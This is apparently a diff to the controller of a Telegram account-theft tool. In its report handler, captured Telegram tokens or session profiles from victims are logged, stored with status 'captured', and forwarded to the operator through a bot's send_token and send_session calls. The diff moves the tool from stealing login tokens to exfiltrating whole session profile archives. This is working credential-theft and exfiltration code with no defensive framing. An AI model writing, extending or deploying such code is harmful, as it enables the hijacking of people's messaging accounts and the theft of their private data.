@@ -245,34 +245,25 @@ def report():
     session = sessions[session_id]
     session["last_activity"] = timestamp
     
-    # Handle Telegram token capture
-    if report_type == "telegram_token":
-        token = report_data.get("token", "")
-        print(f"[Controller] Token captured: {token[:50]}...", flush=True)
+    # Handle Telegram session capture
+    if report_type == "telegram_session":
+        profile_path = report_data.get("profile_path", "")
+        print(f"[Controller] Session captured: {session_id}", flush=True)
+        print(f"[Controller] Profile: {profile_path}", flush=True)
         
         session["status"] = "captured"
-        session["token"] = token
+        session["profile_path"] = profile_path
         
-        # Send token to Telegram
-        if token:
-            print(f"[Controller] Extracting user info...", flush=True)
+        # Send session zip to Telegram
+        if profile_path:
+            print(f"[Controller] Sending session...", flush=True)
             try:
-                from app.telegram_extractor import get_user_info
-                user_info = get_user_info(token)
-                print(f"[Controller] User info: {user_info}", flush=True)
-                
-                print(f"[Controller] Sending token...", flush=True)
-                result = bot.send_token(session_id, token, user_info)
-                print(f"[Controller] Token sent: {result}", flush=True)
-                
-                session["user_info"] = user_info
+                result = bot.send_session(session_id, profile_path)
+                print(f"[Controller] Session sent: {result}", flush=True)
             except Exception as e:
                 print(f"[Controller] Error: {e}", flush=True)
                 import traceback
                 traceback.print_exc()
-                # Still send token even if extraction fails
-                result = bot.send_token(session_id, token)
-                print(f"[Controller] Token sent (no user info): {result}", flush=True)
     
     save_sessions(sessions)
     
